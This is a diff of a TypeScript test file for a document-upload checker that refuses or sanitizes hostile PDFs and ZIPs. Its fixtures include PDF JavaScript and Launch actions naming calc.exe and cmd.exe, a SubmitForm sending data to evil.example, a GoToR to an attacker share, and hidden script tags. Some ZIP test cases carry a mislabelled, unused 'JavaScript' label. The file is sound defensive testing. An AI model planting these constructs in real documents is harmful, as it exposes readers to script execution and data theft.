@@ -1,6 +1,6 @@
 import { afterAll, describe, expect, it } from 'vitest';
 import { PDFDocument, PDFName, PDFString } from 'pdf-lib';
-import { detectType } from '../src/documents/content-check.js';
+import { checkUpload, detectType, strictPdfCheck } from '../src/documents/content-check.js';
 import { INSPECTOR_LIMITS, inspectUpload, stallForTest, stopInspector } from '../src/documents/content-inspector.js';
 import { looksLikeZip, ZIP_LIMITS } from '../src/documents/zip-inspect.js';
 import * as B from './fixtures/hostile/build.js';
@@ -20,6 +20,25 @@ const refused = async (buf: Buffer, name: string): Promise<string> => {
   }
 };
 const accepted = async (buf: Buffer, name: string) => (await detectType(buf, name)).ext;
+/** The strict check alone: what the REBUILT file must pass (the re-inspection guard). */
+const strictRefusal = async (buf: Buffer): Promise<string> => {
+  try {
+    await strictPdfCheck(buf);
+    return 'PASSED the strict check';
+  } catch (err) {
+    return (err as Error).message;
+  }
+};
+/** Through the upload check: sanitized, the output passes the strict check, same page count. */
+const sanitized = async (buf: Buffer): Promise<string[]> => {
+  const r = await checkUpload(buf, 'x.pdf');
+  expect(r.type.ext).toBe('pdf');
+  expect(r.sanitized).toBeDefined();
+  await strictPdfCheck(r.sanitized!.data);
+  const [a, b] = await Promise.all([PDFDocument.load(buf, { updateMetadata: false }), PDFDocument.load(r.sanitized!.data, { updateMetadata: false })]);
+  expect(b.getPageCount()).toBe(a.getPageCount());
+  return r.sanitized!.removed;
+};
 
 const JS_ACTION = '<</S/JavaScript/JS(app.alert(1))>>';
 /** One object stream holding `body` as object 5, referenced from the catalog or a page. */
@@ -29,15 +48,18 @@ const compressed = (body: string, where: { catalogExtra?: string; pageExtra?: st
 afterAll(() => stopInspector());
 
 describe('PDF: the raw-bytes passes', () => {
-  it('first pass: a plain /JavaScript action is refused on sight', async () => {
-    expect(await refused(B.pdf({ catalogExtra: `/OpenAction${JS_ACTION}` }), 'a.pdf'))
-      .toBe('PDFs containing JavaScript, launch actions or embedded files are not accepted');
+  it('first pass: a plain /JavaScript action fails the strict check on sight; on upload it is removed', async () => {
+    const p = B.pdf({ catalogExtra: `/OpenAction${JS_ACTION}` });
+    expect(await strictRefusal(p)).toBe('PDFs containing JavaScript, launch actions or embedded files are not accepted');
+    expect(await sanitized(p)).toEqual(['JavaScript', 'OpenAction']);
   });
 
   it('second pass: names written with #xx escapes (/J#61vaScript, lower-case hex too)', async () => {
     for (const name of ['/J#61vaScript', '/#4aavaScript', '/L#61unch', '/Emb#65ddedFile', '/#58FA']) {
-      const msg = await refused(B.pdf({ catalogExtra: `/Foo ${name}` }), 'a.pdf');
-      expect(msg, name).toBe('PDFs containing JavaScript, launch actions or embedded files are not accepted (names written with #xx escapes)');
+      const p = B.pdf({ catalogExtra: `/Foo ${name}` });
+      expect(await strictRefusal(p), name).toBe('PDFs containing JavaScript, launch actions or embedded files are not accepted (names written with #xx escapes)');
+      // The catalog is never copied: the rebuilt file is clean, and the name is reported.
+      expect((await sanitized(p)).length, name).toBe(1);
     }
   });
 
@@ -61,29 +83,30 @@ describe('PDF: the raw-bytes passes', () => {
 });
 
 describe('PDF: structural inspection (pdf-lib, inside compressed object streams)', () => {
-  const cases: [string, Buffer, string][] = [
-    ['OpenAction JavaScript in an object stream', compressed(JS_ACTION, { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing JavaScript are not accepted'],
-    ['Launch action in an object stream', compressed('<</S/Launch/F(calc.exe)>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing launch actions are not accepted'],
-    ['Launch with a lower-case hex-escaped name, compressed', compressed('<</S/#4caunch/F(cmd.exe)>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing launch actions are not accepted'],
-    ['page additional action (AA) with JavaScript', compressed(`<</O ${JS_ACTION}>>`, { pageExtra: '/AA 5 0 R' }), 'PDFs containing JavaScript are not accepted'],
-    ['annotation AA with JavaScript', compressed(`<</Type/Annot/Subtype/Widget/Rect[0 0 10 10]/AA<</E ${JS_ACTION}>>>>`, { pageExtra: '/Annots[5 0 R]' }), 'PDFs containing JavaScript are not accepted'],
-    ['form field calculate action', compressed(`<</FT/Tx/T(f)/AA<</C ${JS_ACTION}>>>>`, { catalogExtra: '/AcroForm<</Fields[5 0 R]>>' }), 'PDFs containing JavaScript are not accepted'],
-    ['document-level Names JavaScript tree', compressed('<</JavaScript<</Names[(x) 6 0 R]>>>>', { catalogExtra: '/Names 5 0 R' }), 'PDFs containing JavaScript are not accepted'],
-    ['XFA form', compressed('<</Fields[]/XFA 6 0 R>>', { catalogExtra: '/AcroForm 5 0 R' }), 'PDFs containing XFA forms are not accepted'],
-    ['EmbeddedFiles name tree', compressed('<</EmbeddedFiles<</Names[]>>>>', { catalogExtra: '/Names 5 0 R' }), 'PDFs containing embedded files are not accepted'],
-    ['FileAttachment annotation', compressed('<</Type/Annot/Subtype/FileAttachment/Rect[0 0 1 1]/FS<</Type/Filespec/F(a.exe)>>>>', { pageExtra: '/Annots[5 0 R]' }), 'PDFs containing embedded files are not accepted'],
-    ['RichMedia annotation', compressed('<</Type/Annot/Subtype/RichMedia/Rect[0 0 1 1]>>', { pageExtra: '/Annots[5 0 R]' }), 'PDFs containing active content (RichMedia) are not accepted'],
-    ['GoToR remote go-to', compressed('<</S/GoToR/F(\\\\\\\\attacker\\\\share\\\\x.pdf)/D[0/Fit]>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing active content (GoToR) are not accepted'],
-    ['SubmitForm (sends form data away)', compressed('<</S/SubmitForm/F<</FS/URL/F(https://evil.example/)>>>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing active content (SubmitForm) are not accepted'],
-    ['URI action to file://', compressed('<</S/URI/URI(file:///C:/Windows/System32/calc.exe)>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs with links to local files or other non-web addresses are not accepted'],
-    ['URI action to a UNC path (hex string)', compressed('<</S/URI/URI<5c5c6576696c5c73>>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs with links to local files or other non-web addresses are not accepted'],
-    ['an action in an unreferenced object (orphan)', compressed(JS_ACTION, {}), 'PDFs containing JavaScript are not accepted'],
+  const cases: [string, Buffer, string, string][] = [
+    ['OpenAction JavaScript in an object stream', compressed(JS_ACTION, { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing JavaScript are not accepted', 'JavaScript'],
+    ['Launch action in an object stream', compressed('<</S/Launch/F(calc.exe)>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing launch actions are not accepted', 'Launch action'],
+    ['Launch with a lower-case hex-escaped name, compressed', compressed('<</S/#4caunch/F(cmd.exe)>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing launch actions are not accepted', 'Launch action'],
+    ['page additional action (AA) with JavaScript', compressed(`<</O ${JS_ACTION}>>`, { pageExtra: '/AA 5 0 R' }), 'PDFs containing JavaScript are not accepted', 'JavaScript'],
+    ['annotation AA with JavaScript', compressed(`<</Type/Annot/Subtype/Widget/Rect[0 0 10 10]/AA<</E ${JS_ACTION}>>>>`, { pageExtra: '/Annots[5 0 R]' }), 'PDFs containing JavaScript are not accepted', 'JavaScript'],
+    ['form field calculate action', compressed(`<</FT/Tx/T(f)/AA<</C ${JS_ACTION}>>>>`, { catalogExtra: '/AcroForm<</Fields[5 0 R]>>' }), 'PDFs containing JavaScript are not accepted', 'JavaScript'],
+    ['document-level Names JavaScript tree', compressed('<</JavaScript<</Names[(x) 6 0 R]>>>>', { catalogExtra: '/Names 5 0 R' }), 'PDFs containing JavaScript are not accepted', 'JavaScript'],
+    ['XFA form', compressed('<</Fields[]/XFA 6 0 R>>', { catalogExtra: '/AcroForm 5 0 R' }), 'PDFs containing XFA forms are not accepted', 'XFA form'],
+    ['EmbeddedFiles name tree', compressed('<</EmbeddedFiles<</Names[]>>>>', { catalogExtra: '/Names 5 0 R' }), 'PDFs containing embedded files are not accepted', 'EmbeddedFiles'],
+    ['FileAttachment annotation', compressed('<</Type/Annot/Subtype/FileAttachment/Rect[0 0 1 1]/FS<</Type/Filespec/F(a.exe)>>>>', { pageExtra: '/Annots[5 0 R]' }), 'PDFs containing embedded files are not accepted', 'FileAttachment annotation'],
+    ['RichMedia annotation', compressed('<</Type/Annot/Subtype/RichMedia/Rect[0 0 1 1]>>', { pageExtra: '/Annots[5 0 R]' }), 'PDFs containing active content (RichMedia) are not accepted', 'RichMedia/3D/multimedia'],
+    ['GoToR remote go-to', compressed('<</S/GoToR/F(\\\\\\\\attacker\\\\share\\\\x.pdf)/D[0/Fit]>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing active content (GoToR) are not accepted', 'Links to other files (GoToR/GoToE)'],
+    ['SubmitForm (sends form data away)', compressed('<</S/SubmitForm/F<</FS/URL/F(https://evil.example/)>>>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing active content (SubmitForm) are not accepted', 'SubmitForm action'],
+    ['URI action to file://', compressed('<</S/URI/URI(file:///C:/Windows/System32/calc.exe)>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs with links to local files or other non-web addresses are not accepted', 'Non-web link (URI)'],
+    ['URI action to a UNC path (hex string)', compressed('<</S/URI/URI<5c5c6576696c5c73>>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs with links to local files or other non-web addresses are not accepted', 'Non-web link (URI)'],
+    ['an action in an unreferenced object (orphan)', compressed(JS_ACTION, {}), 'PDFs containing JavaScript are not accepted', 'JavaScript'],
   ];
-  for (const [name, buf, msg] of cases) {
-    it(`refuses: ${name}`, async () => {
+  for (const [name, buf, msg, label] of cases) {
+    it(`strict check refuses, upload sanitizes: ${name}`, async () => {
       // The raw bytes really are clean: only the structure gives it away.
       expect(/JavaScript|Launch|XFA|EmbeddedFile|RichMedia|GoToR|SubmitForm|file:/.test(buf.toString('latin1'))).toBe(false);
-      expect(await refused(buf, 'x.pdf')).toBe(msg);
+      expect(await strictRefusal(buf)).toBe(msg);
+      expect(await sanitized(buf)).toContain(label);
     });
   }
 
@@ -91,7 +114,8 @@ describe('PDF: structural inspection (pdf-lib, inside compressed object streams)
     // Object 5 is defined twice; the later, clean copy replaces it for
     // pdf-lib, but a viewer following the first xref would load the first.
     const p = B.pdf({ extra: [B.objStm(4, [{ num: 5, body: '<</S/Launch/F(calc.exe)>>' }]), Buffer.from('5 0 obj\n<</Clean true>>\nendobj\n', 'latin1')] });
-    expect(await refused(p, 'x.pdf')).toBe('PDFs containing launch actions are not accepted');
+    expect(await strictRefusal(p)).toBe('PDFs containing launch actions are not accepted');
+    expect(await sanitized(p)).toEqual(['Launch action']);
   });
 
   it('refuses an object hidden inside another object\'s stream data', async () => {
@@ -150,14 +174,15 @@ describe('PDF: structural inspection (pdf-lib, inside compressed object streams)
     expect(await accepted(bytes, 'r.pdf')).toBe('pdf');
   });
 
-  it('a pdf-lib document with a JavaScript action added is refused', async () => {
+  it('a pdf-lib document with a JavaScript action added fails the strict check, and is sanitized on upload', async () => {
     const doc = await PDFDocument.create();
     doc.addPage();
     const action = doc.context.obj({ S: 'JavaScript', JS: PDFString.of('app.alert(1)') });
     doc.catalog.set(PDFName.of('OpenAction'), doc.context.register(action));
     const bytes = Buffer.from(await doc.save({ useObjectStreams: true }));
     expect(bytes.toString('latin1')).not.toContain('/JavaScript');
-    expect(await refused(bytes, 'x.pdf')).toBe('PDFs containing JavaScript are not accepted');
+    expect(await strictRefusal(bytes)).toBe('PDFs containing JavaScript are not accepted');
+    expect(await sanitized(bytes)).toEqual(['JavaScript', 'OpenAction']);
   });
 });
 
@@ -217,18 +242,18 @@ describe('ZIP structure (Office files)', () => {
     { name: '[Content_Types].xml', data: '<Types/>' },
     { name: 'word/document.xml', data: '<w:document/>' },
   ];
-  const cases: [string, Buffer, string][] = [
-    ['local header name differs from the central directory', B.zip(files(), { localName: { 'word/document.xml': 'word/documenX.xml' } }), 'local header name disagrees with central directory'],
-    ['duplicate entry names', B.zip([...files(), { name: 'word/document.xml', data: '<x/>' }]), 'duplicate entry name'],
-    ['duplicate names differing only in case', B.zip([...files(), { name: 'WORD/document.xml', data: '<x/>' }]), 'duplicate entry name'],
-    ['a directory entry pointing at another entry\'s local header', B.zip([...files(), { name: 'word/other.xml', data: '<w:document/>' }], { pointAt: { 'word/other.xml': 'word/document.xml' } }), 'local header name disagrees with central directory'],
-    ['entries whose data overlap (overlapping-entry zip bomb)', B.zip(files(), { declaredComp: { '[Content_Types].xml': 40 } }), 'overlapping entries'],
-    ['data hidden in a gap between entries', B.zip(files(), { gapAfter: { '[Content_Types].xml': Buffer.from('<html><script>alert(1)</script></html>') } }), 'unaccounted data between entries'],
-    ['data appended after the archive', B.zip(files(), { trailing: Buffer.from('<script>alert(1)</script>') }), 'data after the end of the archive'],
-    ['declared size smaller than the real data', B.zip(files(), { declaredSize: { 'word/document.xml': 3 } }), 'part word/document.xml is corrupt or larger than declared'],
-    ['declared ratio of a zip bomb', B.zip([...files(), { name: 'word/big.xml', data: Buffer.alloc(2 * 1024 * 1024) }]), 'compression ratio too high (zip bomb)'],
-    ['encrypted entry', B.zip(files(), { flags: { 'word/document.xml': 1 } }), 'encrypted entry'],
-    ['entry count in the end record differs', B.zip(files(), { eocdEntries: 3 }), 'central directory entry malformed'],
+  const cases: [string, Buffer, string, string][] = [
+    ['local header name differs from the central directory', B.zip(files(), { localName: { 'word/document.xml': 'word/documenX.xml' } }), 'local header name disagrees with central directory', 'JavaScript'],
+    ['duplicate entry names', B.zip([...files(), { name: 'word/document.xml', data: '<x/>' }]), 'duplicate entry name', 'JavaScript'],
+    ['duplicate names differing only in case', B.zip([...files(), { name: 'WORD/document.xml', data: '<x/>' }]), 'duplicate entry name', 'JavaScript'],
+    ['a directory entry pointing at another entry\'s local header', B.zip([...files(), { name: 'word/other.xml', data: '<w:document/>' }], { pointAt: { 'word/other.xml': 'word/document.xml' } }), 'local header name disagrees with central directory', 'JavaScript'],
+    ['entries whose data overlap (overlapping-entry zip bomb)', B.zip(files(), { declaredComp: { '[Content_Types].xml': 40 } }), 'overlapping entries', 'JavaScript'],
+    ['data hidden in a gap between entries', B.zip(files(), { gapAfter: { '[Content_Types].xml': Buffer.from('<html><script>alert(1)</script></html>') } }), 'unaccounted data between entries', 'JavaScript'],
+    ['data appended after the archive', B.zip(files(), { trailing: Buffer.from('<script>alert(1)</script>') }), 'data after the end of the archive', 'JavaScript'],
+    ['declared size smaller than the real data', B.zip(files(), { declaredSize: { 'word/document.xml': 3 } }), 'part word/document.xml is corrupt or larger than declared', 'JavaScript'],
+    ['declared ratio of a zip bomb', B.zip([...files(), { name: 'word/big.xml', data: Buffer.alloc(2 * 1024 * 1024) }]), 'compression ratio too high (zip bomb)', 'JavaScript'],
+    ['encrypted entry', B.zip(files(), { flags: { 'word/document.xml': 1 } }), 'encrypted entry', 'JavaScript'],
+    ['entry count in the end record differs', B.zip(files(), { eocdEntries: 3 }), 'central directory entry malformed', 'JavaScript'],
   ];
   for (const [name, buf, why] of cases) {
     it(`refuses: ${name}`, async () => {
@@ -312,7 +337,7 @@ describe('the worker pool: isolation and limits', () => {
     INSPECTOR_LIMITS.timeoutMs = 120_000; // a loaded CI machine must not turn this into a time-out
     try {
       const many = Array.from({ length: 150_000 }, (_, i) => ({ num: 10 + i, body: '<</A[1 2 3]/B(x)>>' }));
-      expect((await inspectUpload(B.pdf({ extra: [B.objStm(4, many)] }), 'heavy.pdf')).ext).toBe('pdf');
+      expect((await inspectUpload(B.pdf({ extra: [B.objStm(4, many)] }), 'heavy.pdf')).type.ext).toBe('pdf');
     } finally {
       INSPECTOR_LIMITS.timeoutMs = saved;
     }
@@ -330,7 +355,7 @@ describe('the worker pool: isolation and limits', () => {
     } finally {
       INSPECTOR_LIMITS.timeoutMs = saved;
     }
-    expect((await inspectUpload(B.pdf(), 'next.pdf')).ext).toBe('pdf');
+    expect((await inspectUpload(B.pdf(), 'next.pdf')).type.ext).toBe('pdf');
   });
 
   it('a file that exhausts the worker heap is refused, and the next file is checked normally', async () => {
@@ -347,10 +372,17 @@ describe('the worker pool: isolation and limits', () => {
       INSPECTOR_LIMITS.timeoutMs = savedTimeout;
       await stopInspector();
     }
-    expect((await inspectUpload(B.pdf(), 'next.pdf')).ext).toBe('pdf');
+    expect((await inspectUpload(B.pdf(), 'next.pdf')).type.ext).toBe('pdf');
   }, 180_000);
 
   it('refusals inside the worker come back as refusals, not crashes', async () => {
-    await expect(inspectUpload(compressed(JS_ACTION, { catalogExtra: '/OpenAction 5 0 R' }), 'x.pdf')).rejects.toThrow('PDFs containing JavaScript are not accepted');
+    await expect(inspectUpload(B.pdf({ trailerExtra: '/Encrypt<</Filter/Standard/V 2/R 3/O(x)/U(y)/P -4>>' }), 'x.pdf')).rejects.toThrow('Encrypted PDFs cannot be checked');
+  });
+
+  it('a PDF is rebuilt inside the worker: the rebuilt bytes and what was removed come back', async () => {
+    const r = await inspectUpload(compressed(JS_ACTION, { catalogExtra: '/OpenAction 5 0 R' }), 'x.pdf');
+    expect(r.type.ext).toBe('pdf');
+    expect(r.sanitized!.removed).toEqual(['JavaScript', 'OpenAction']);
+    await strictPdfCheck(r.sanitized!.data);
   });
 });
